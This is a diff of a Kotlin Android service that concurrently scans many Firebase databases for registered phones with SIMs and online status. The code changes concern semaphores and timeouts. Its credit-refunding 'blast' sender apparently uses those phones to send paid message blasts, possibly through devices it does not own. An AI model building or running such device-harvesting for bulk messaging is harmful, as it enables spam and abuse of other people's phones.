@@ -22,6 +22,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicInteger
 
 data class Device(
     val firebaseUrl: String,
@@ -78,9 +79,10 @@ class RealtimeDbService {
         private const val TAG = "RealtimeDbService"
         private const val SCAN_CACHE_MS = 5 * 60 * 1000L
         private const val EMPTY_SCAN_CACHE_MS = 15 * 1000L
-        private const val PER_FIREBASE_TIMEOUT_MS = 8_000L
-
-        // 10 minutes — was 60 seconds. Devices sleeping for a few mins shouldn't disappear.
+        private const val TOTAL_SCAN_TIMEOUT_MS = 30_000L
+        private const val CLIENTS_JSON_TIMEOUT_MS = 5_000L
+        private const val GLOBAL_DEVICE_CONCURRENCY = 200
+        private const val PER_FIREBASE_CONCURRENCY = 20
         private const val ONLINE_WINDOW_SEC = 600L
     }
 
@@ -129,13 +131,12 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  DEEP TEST — total + online counts for a single firebase
+    //  TEST SINGLE FIREBASE — deep check with online/total
     // ============================================================
     suspend fun testFirebase(fb: FirebaseNode): FirebaseTestResult = withContext(Dispatchers.IO) {
         val baseUrl = fb.url.trimEnd('/')
         val clientsUrl = "$baseUrl/clients.json?shallow=true"
 
-        // Step 1: fetch client IDs
         val clientIds: List<String>
         try {
             val req = Request.Builder()
@@ -195,8 +196,7 @@ class RealtimeDbService {
             )
         }
 
-        // Step 2: fetch each device, count online vs total
-        val onlineCounter = java.util.concurrent.atomic.AtomicInteger(0)
+        val onlineCounter = AtomicInteger(0)
         val sem = Semaphore(30)
 
         coroutineScope {
@@ -215,7 +215,7 @@ class RealtimeDbService {
         val online = onlineCounter.get()
         val total = clientIds.size
         val errMsg: String? = when {
-            online > 0 -> null  // healthy
+            online > 0 -> null
             total == 0 -> "No clients registered"
             online == 0 -> "$total registered, 0 online (all dead)"
             else -> null
@@ -232,7 +232,10 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  SCAN ALL — per-firebase timeout, partial success
+    //  SCAN ALL
+    //  - Per-firebase + global semaphores (no starvation)
+    //  - Streaming results (partial preserved on timeout)
+    //  - 30s total safety cap; dead firebases fast-skip
     // ============================================================
     suspend fun scanAll(
         firebases: List<FirebaseNode>,
@@ -256,105 +259,120 @@ class RealtimeDbService {
 
         Log.d(TAG, "scanAll: fresh scan of ${firebases.size} firebase(s)")
 
-        val deviceSem = Semaphore(200)
         val allFound = java.util.Collections.synchronizedList(mutableListOf<Device>())
-        var successCount = 0
-        var failedCount = 0
+        val globalSem = Semaphore(GLOBAL_DEVICE_CONCURRENCY)
+        var completed = false
 
-        coroutineScope {
-            val jobs = firebases.mapIndexed { idx, fb ->
-                async(Dispatchers.IO) {
-                    try {
-                        val partial = withTimeoutOrNull(PER_FIREBASE_TIMEOUT_MS) {
-                            scanFirebase(fb, deviceSem) { _ ->
-                                onProgress?.invoke(idx, allFound.size)
-                            }
+        withTimeoutOrNull(TOTAL_SCAN_TIMEOUT_MS) {
+            coroutineScope {
+                firebases.mapIndexed { idx, fb ->
+                    async(Dispatchers.IO) {
+                        try {
+                            scanFirebase(
+                                fb = fb,
+                                globalSem = globalSem,
+                                onDevice = { dev ->
+                                    allFound.add(dev)
+                                    onProgress?.invoke(idx, allFound.size)
+                                },
+                            )
+                        } catch (e: CancellationException) {
+                            throw e
+                        } catch (e: Exception) {
+                            Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
                         }
-                        if (partial == null) {
-                            Log.w(TAG, "scan timeout for ${fb.label} after ${PER_FIREBASE_TIMEOUT_MS / 1000}s")
-                            failedCount++
-                        } else {
-                            allFound.addAll(partial)
-                            successCount++
-                            onProgress?.invoke(idx, allFound.size)
-                        }
-                    } catch (e: CancellationException) {
-                        throw e
-                    } catch (e: Exception) {
-                        Log.w(TAG, "scanFirebase crashed: ${fb.label}", e)
-                        failedCount++
                     }
-                }
+                }.awaitAll()
             }
-            jobs.awaitAll()
-        }
+            completed = true
+        } ?: Log.w(
+            TAG,
+            "scanAll timeout after ${TOTAL_SCAN_TIMEOUT_MS / 1000}s — preserving ${allFound.size} partial device(s)"
+        )
 
         val final = allFound.toList()
-        Log.d(TAG, "scanAll done: ${final.size} device(s) from $successCount ok / $failedCount failed firebase(s)")
-        scanCache[key] = ScanCache(final, System.currentTimeMillis())
+        Log.d(TAG, "scanAll done: ${final.size} device(s) (completed=$completed)")
+
+        // Cache only completed scans — timeouts are retried fresh next time
+        if (completed) {
+            scanCache[key] = ScanCache(final, System.currentTimeMillis())
+        }
+
         final
     }
 
+    // ============================================================
+    //  SCAN SINGLE FIREBASE — streaming, per-fb fairness
+    // ============================================================
     private suspend fun scanFirebase(
         fb: FirebaseNode,
-        deviceSem: Semaphore,
-        onProgress: ((found: Int) -> Unit)? = null,
-    ): List<Device> = coroutineScope {
+        globalSem: Semaphore,
+        onDevice: (Device) -> Unit,
+    ): Unit = coroutineScope {
         val baseUrl = fb.url.trimEnd('/')
         val clientsUrl = baseUrl + FirebaseConfig.RTDB_CLIENTS
 
+        // 1. Fetch client list — 5s fast timeout so dead firebases don't waste scan budget
         val bodyText: String? = try {
-            val req = Request.Builder()
-                .url(clientsUrl)
-                .header("Accept", "application/json")
-                .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
-                .get().build()
-            http.newCall(req).execute().use { resp ->
-                if (!resp.isSuccessful) {
-                    Log.w(TAG, "scan ${fb.label}: HTTP ${resp.code}")
-                    null
-                } else resp.body?.string()?.trim()
+            withTimeoutOrNull(CLIENTS_JSON_TIMEOUT_MS) {
+                val req = Request.Builder()
+                    .url(clientsUrl)
+                    .header("Accept", "application/json")
+                    .header("User-Agent", "Mozilla/5.0 (Linux; Android) SanjiApp/1.0")
+                    .get().build()
+                http.newCall(req).execute().use { resp ->
+                    if (!resp.isSuccessful) {
+                        Log.d(TAG, "scan ${fb.label}: HTTP ${resp.code}")
+                        null
+                    } else resp.body?.string()?.trim()
+                }
             }
         } catch (e: CancellationException) { throw e }
         catch (e: Exception) {
-            Log.w(TAG, "scan ${fb.label} list failed: ${e.message}")
+            Log.w(TAG, "scan ${fb.label} clients.json failed: ${e.message}")
             null
         }
 
         if (bodyText.isNullOrEmpty() || bodyText == "null") {
-            return@coroutineScope emptyList<Device>()
+            Log.d(TAG, "scan ${fb.label}: empty clients list")
+            return@coroutineScope
         }
 
-        val idsObj = try { JSONObject(bodyText) }
-        catch (_: Exception) { return@coroutineScope emptyList<Device>() }
+        val deviceIds: List<String> = try {
+            val obj = JSONObject(bodyText)
+            val list = mutableListOf<String>()
+            val keys = obj.keys()
+            while (keys.hasNext()) list.add(keys.next())
+            list
+        } catch (_: Exception) { return@coroutineScope }
 
-        val deviceIds = mutableListOf<String>()
-        val keys = idsObj.keys()
-        while (keys.hasNext()) deviceIds.add(keys.next())
-        if (deviceIds.isEmpty()) return@coroutineScope emptyList<Device>()
+        if (deviceIds.isEmpty()) return@coroutineScope
 
-        val found = java.util.Collections.synchronizedList(mutableListOf<Device>())
+        Log.d(TAG, "scan ${fb.label}: ${deviceIds.size} client(s) to check")
+
+        // 2. Per-firebase semaphore — one heavy firebase cannot hog global permits
+        val perFbSem = Semaphore(PER_FIREBASE_CONCURRENCY)
 
         deviceIds.map { devId ->
             async(Dispatchers.IO) {
                 try {
-                    deviceSem.withPermit {
-                        val dev = fetchDevice(fb, devId)
-                        if (dev != null) {
-                            found.add(dev)
-                            onProgress?.invoke(found.size)
+                    perFbSem.withPermit {
+                        globalSem.withPermit {
+                            val dev = fetchDevice(fb, devId)
+                            if (dev != null) {
+                                onDevice(dev)
+                            }
                         }
                     }
-                } catch (e: CancellationException) { throw e }
-                catch (_: Exception) {}
+                } catch (e: CancellationException) {
+                    throw e
+                } catch (_: Exception) {}
             }
         }.awaitAll()
-
-        found.toList()
     }
 
     // ============================================================
-    //  FETCH DEVICE — full object
+    //  FETCH DEVICE
     // ============================================================
     private fun fetchDeviceObject(fb: FirebaseNode, devId: String): JSONObject? {
         return try {
@@ -376,9 +394,6 @@ class RealtimeDbService {
     private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
         val obj = fetchDeviceObject(fb, devId) ?: return null
 
-        // Accept device if it has ANY usable identity data — even if lastSeen is old.
-        // Rationale: an offline device still appears in the list; send attempts to it
-        // will fail and BlastExecutor refunds credits. Better than showing 0 devices.
         val hasUsableData =
             obj.has("deviceName") || obj.has("phoneNumber") || obj.has("phone") ||
                     obj.has("number") || obj.has("sims") || obj.has("sim")
@@ -387,7 +402,6 @@ class RealtimeDbService {
 
         val isOnlineNow = isOnline(obj)
         if (!isOnlineNow) {
-            // Offline — include only if it has more than just a status field
             val name = obj.optString("deviceName", obj.optString("name", ""))
             val phone = obj.optString("phoneNumber", obj.optString("phone", ""))
             val hasSims = obj.has("sims") || obj.has("sim")
@@ -411,10 +425,9 @@ class RealtimeDbService {
     }
 
     // ============================================================
-    //  ONLINE DETECTION — lenient, more field names, longer window
+    //  ONLINE DETECTION — lenient
     // ============================================================
     private fun isOnline(obj: JSONObject): Boolean {
-        // 1. Explicit online flags
         for (key in listOf("isOnline", "online", "connected", "active", "enabled")) {
             val v = obj.opt(key) ?: continue
             if (v is Boolean && v) return true
@@ -425,7 +438,6 @@ class RealtimeDbService {
             }
         }
 
-        // 2. Status string
         val st = obj.opt("status")
         if (st is Boolean && st) return true
         if (st is String) {
@@ -433,7 +445,6 @@ class RealtimeDbService {
             if (s == "online" || s == "active" || s == "connected" || s == "1") return true
         }
 
-        // 3. lastSeen — try every common name, handle sec/ms/string
         val lastSeenKeys = listOf(
             "lastSeen", "last_seen", "lastOnline", "lastPing",
             "lastConnected", "last_active", "lastActive", "timestamp", "ts",
